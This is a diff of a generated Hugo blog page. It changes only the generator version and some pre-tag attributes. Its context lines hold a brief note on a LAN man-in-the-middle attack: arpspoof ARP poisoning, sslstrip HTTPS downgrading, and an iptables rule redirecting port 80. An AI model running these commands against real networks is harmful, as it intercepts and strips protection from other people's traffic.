@@ -25,7 +25,7 @@ sudo arpspoof -i [interface] -t [target mac] -r [gataway mac] traffic redirect s
 <link rel="mask-icon" href="https://chibataiki.github.io/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<meta name="generator" content="Hugo 0.92.0" />
+<meta name="generator" content="Hugo 0.87.0" />
 <noscript>
     <style>
         #theme-toggle,
@@ -225,9 +225,9 @@ sudo arpspoof -i [interface] -t [target mac] -r [gataway mac] traffic redirect s
 <p>sslstrip can watch http traffic and change all https links to http</p>
 <h3 id="arpspoof">arpspoof<a hidden class="anchor" aria-hidden="true" href="#arpspoof">#</a></h3>
 <p>send ARP messages on LAN associate the attacker&rsquo;s Mac address with the gateway ip, then all traffic will send too attacker&rsquo;s machine</p>
-<pre tabindex="0"><code>sudo arpspoof -i [interface] -t [target mac] -r [gataway mac]
+<pre><code>sudo arpspoof -i [interface] -t [target mac] -r [gataway mac]
 </code></pre><h3 id="traffic-redirect">traffic redirect<a hidden class="anchor" aria-hidden="true" href="#traffic-redirect">#</a></h3>
-<pre tabindex="0"><code>sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+<pre><code>sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 </code></pre><p>referer:<br>
 <a href="https://github.com/moxie0/sslstrip">https://github.com/moxie0/sslstrip</a>
 <a href="https://www.youtube.com/watch?v=MFol6IMbZ7Y">https://www.youtube.com/watch?v=MFol6IMbZ7Y</a></p>
